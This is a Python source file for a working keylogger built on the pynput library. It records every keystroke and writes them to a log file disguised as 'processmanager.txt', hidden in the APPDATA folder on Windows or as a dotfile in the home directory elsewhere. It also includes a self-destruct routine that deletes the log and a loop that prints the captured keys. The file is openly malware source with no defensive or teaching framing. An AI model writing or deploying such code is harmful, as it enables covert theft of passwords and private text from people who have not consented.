import os
import threading
from sys import platform
from time import sleep
from pynput.keyboard import Listener

class Keylogger:
    def __init__(self):
        self.keys = []
        self.count = 0
        self.flag = 0
        self.listener = None
        self._lock = threading.Lock()
        
        # Set the log file path based on platform
        if platform == 'win32':
            self.path = os.path.join(os.environ['appdata'], 'processmanager.txt')
        else:  # linux, darwin
            self.path = os.path.join(os.path.expanduser('~'), '.processmanager.txt')
        
        # Create the log file if it doesn't exist
        self._ensure_file_exists()

    def _ensure_file_exists(self):
        """Create the log file if it doesn't exist"""
        try:
            if not os.path.exists(self.path):
                with open(self.path, 'w') as f:
                    f.write('')  # Create empty file
        except Exception as e:
            print(f"Error creating log file: {e}")

    def on_press(self, key):
        """Handle key press events"""
        try:
            with self._lock:
                self.keys.append(key)
                self.count += 1

                if self.count >= 1:
                    self.count = 0
                    self.write_file(self.keys)
                    self.keys = []
            return not self.flag  # Stop listener if flag is set
        except Exception as e:
            print(f"Error in on_press: {e}")
            return False  # Stop listener on error

    def read_logs(self):
        """Read and return the contents of the log file"""
        try:
            with self._lock:
                if os.path.exists(self.path):
                    with open(self.path, 'rt') as f:
                        return f.read()
                return ""
        except Exception as e:
            print(f"Error reading logs: {e}")
            return f"Error reading logs: {e}"

    def write_file(self, keys):
        """Write captured keys to the log file"""
        try:
            with self._lock:
                with open(self.path, 'a') as f:
                    for key in keys:
                        k = str(key).replace("'", "")
                        if k.find('backspace') > 0:
                            f.write(' [BACKSPACE] ')
                        elif k.find('enter') > 0:
                            f.write('\n')
                        elif k.find('shift') > 0:
                            f.write(' [SHIFT] ')
                        elif k.find('space') > 0:
                            f.write(' ')
                        elif k.find('caps_lock') > 0:
                            f.write(' [CAPS_LOCK] ')
                        elif k.find('ctrl') > 0:
                            f.write(' [CTRL] ')
                        elif k.find('alt') > 0:
                            f.write(' [ALT] ')
                        elif k.find('tab') > 0:
                            f.write(' [TAB] ')
                        elif k.find('left') > 0:
                            f.write(' [LEFT_ARROW] ')
                        elif k.find('right') > 0:
                            f.write(' [RIGHT_ARROW] ')
                        elif k.find('up') > 0:
                            f.write(' [UP_ARROW] ')
                        elif k.find('down') > 0:
                            f.write(' [DOWN_ARROW] ')
                        elif k.find('Key') >= 0:
                            f.write(f' [{k}] ')
                        else:
                            f.write(k)
        except Exception as e:
            print(f"Error writing to log file: {e}")

    def self_destruct(self):
        """Stop the keylogger and clean up"""
        try:
            self.flag = 1
            if self.listener:
                self.listener.stop()
            if os.path.exists(self.path):
                os.remove(self.path)
        except Exception as e:
            print(f"Error in self_destruct: {e}")

    def overwrite_file(self):
        """Clear the contents of the log file"""
        try:
            print('Clearing keylog file: ' + self.path)
            with self._lock:
                with open(self.path, 'w') as f:
                    f.write('')
        except Exception as e:
            print(f"Error clearing log file: {e}")

    def start(self):
        """Start the keylogger"""
        try:
            self.listener = Listener(on_press=self.on_press)
            self.listener.start()
            self.listener.join()
        except Exception as e:
            print(f"Error starting keylogger: {e}")
            self.flag = 1

if __name__ == '__main__':
    try:
        keylog = Keylogger()
        t = threading.Thread(target=keylog.start)
        t.daemon = True  # Make thread daemon so it exits with the main program
        t.start()
        
        while not keylog.flag:
            sleep(10)
            logs = keylog.read_logs()
            print(logs)
            
        t.join(timeout=1)  # Wait for thread with timeout
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user")
    except Exception as e:
        print(f"Error in main: {e}")